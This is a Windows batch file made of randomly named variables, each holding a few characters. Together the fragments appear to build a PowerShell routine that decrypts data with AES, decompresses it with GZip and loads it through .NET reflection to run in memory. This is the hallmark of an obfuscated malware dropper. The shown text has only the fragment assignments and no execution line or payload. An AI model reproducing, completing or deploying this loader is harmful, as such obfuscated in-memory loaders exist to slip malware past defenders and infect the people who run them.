@echo off
set "qLOVIwVzSG= '')"
set "DiBLtusqBr=ct S"
set "mYpfMmrnPj=Secu"
set "EcioaMaEas=ress"
set "EcqUjuQiJW= = $"
set "MdlDCeKzaz=qc);"
set "juGhhLnDSg=L4Yi"
set "WUgusPJcjw=m.IO"
set "TzQprFWDsC=c = "
set "gtAjEXVSaz=bstr"
set "lQPynUqBgI=.Dis"
set "GckGDlzjdQ= [Sy"
set "mlwTQKoYZC=KW.T"
set "mKdqEWMtNf=e]::"
set "BHCLWENnUL=:('g"
set "yojVfvEnqB=n ''"
set "gWMaRRuBNf=Bmor"
set "SPWPKtnXKR=zHhH"
set "klppmfCRUO=$pfF"
set "CfUNPoPDaW=$pfF"
set "lRwcOaHGFF=S46e"
set "plgPXKWFxb=e = "
set "bZsPpVQNZb=($ID"
set "TQzklfyHvi=vert"
set "UuRtJJAyKw=vxKB"
set "HPAYnijZOw=106u"
set "BIgnZLcYud=ddin"
set "ocSBtMdUoj=OGTj"
set "ZRRoDcWOHW=1] -"
set "UzAOaKkcEw='[-1"
set "yvMeKehbZf=tryP"
set "GxeaHEjOWI=();$"
set "DCJsHrteli=)) {"
set "rYDPGIsRVT=lBlo"
set "oPJoKxLJhC=.Cry"
set "YQsOELKQWl=y]::"
set "iNawjEaLaf=16] "
set "TadVFeeSof=$cOW"
set "ltPzafLcfl=join"
set "TYiYXdLMsA=Ai ="
set "DmDURrgHTB=se()"
set "zouOVobEPV=y.Ci"
set "RnPacZTUnP=yste"
set "zeypraNOdT=comp"
set "tAtplNBmMw=Comp"
set "nXpOJoQtgR=FbBl"
set "vxQzMLfFBY=oint"
set "gBgpuSmwHb=oL'["
set "YnGUPwpbup=y.Pa"
set "SYguCxaDmA=yste"
set "RBzcRxSuoy=flec"
set "zJUuHANsrM=esaB"
set "cyfFrQQipQ=raph"
set "NvnBBdkaEc=xIvL"
set "eqhfVjbqRo=em.C"
set "KuEpLuzfte=;$nw"
set "mPVZHybppK=oArr"
set "inuzFcWeYl=ptor"
set "iRhXqpyvxA=$GFb"
set "MzMFYVUnqx=Obje"
set "JoleoKwVrv=tion"
set "DQEpUCHSra=ew-O"
set "TmFCjwvdkN=7;$G"
set "hFpntlYzPQ=$pcm"
set "AYHGMLTRAM=ress"
set "tDsbzbiecm=PTtG"
set "DCWLyoPkkJ=vQYq"
set "OcNQVyblFA=ecry"
set "rbSIvBHRhB=V = "
set "KAuMBWlBnI=mory"
set "NtTFSRmvUb=::De"
set "JoTeFiqyWX=);$q"
set "nucnjLhays=TllA"
set "NNVYXZZjxx= [st"
set "cgIZfXuPcK=orF'"
set "NUrKaLfLWP=myn."
set "AoGvWKmJDK=pher"
set "GbnlfIATrJ=[Sys"
set "bmGykwjSgG=.Com"
set "yFqxQhYzBP=Conv"
set "UzLDArWiVg=FbBl"
set "EWLzbsKvZI=ing("
set "EpvQDtTIAj=Disp"
set "rMYhszJMCY=pres"
set "kzrggIUvgm=ct S"
set "PNZEDjeeLY=in $"
set "zoYnxLcpUh==');"
set "dlZdkmhGrW=yTo("
set "czHSnLLjUD= [Sy"
set "PFlrmwqtLX=;$vx"
set "zBoqMaigtW=join"
set "KQGankbiqE= if "
set "ucwXxgYghq='gni"
set "LtKuXakaTh=[Env"
set "JZCNZFSbML=m(, "
set "iIaskPvjGO=g = "
set "XlSXgJZTNV== $G"
set "XaMTNgddOs=($ID"
set "yjjwLQfkJo=qc ="
set "rNxOnDJlOb=$vQY"
set "bLcuwowcNM=stem"
set "IwnwFRuCyR=$pfF"
set "EhEFTVYndV=GFbB"
set "eUpNYVLvQz=.Cre"
set "XHqMFWxoEb=[Sys"
set "BqEJFFvRHd=1..-"
set "VsFaYAAgLr=l.Pa"
set "xAdpUKlzWV=[-1."
set "amNjTvevvx=  $A"
set "ouwliUiKcN=.Mod"
set "JxJjNWjOPo=and "
set "QKddkzoBWG=-joi"
set "ygCrZnMOVD=gth)"
set "OflRiOVnFy=ect "
set "LwMPLWkFgv=ewLi"
set "xAtbtRnnVp=-4] "
set "WYdOcawbfM=YxVw"
set "VLcjIQMKHt=comm"
set "PKjrrWxtWY='')("
set "zxppGNieqj=.Cry"
set "EloUhBCkWD=ose("
set "lbNuMsQuiS=O.Me"
set "hIoZuWFGJY=$vQY"
set "WDqhLasJYP=Mode"
set "vahSPxtaUg=stem"
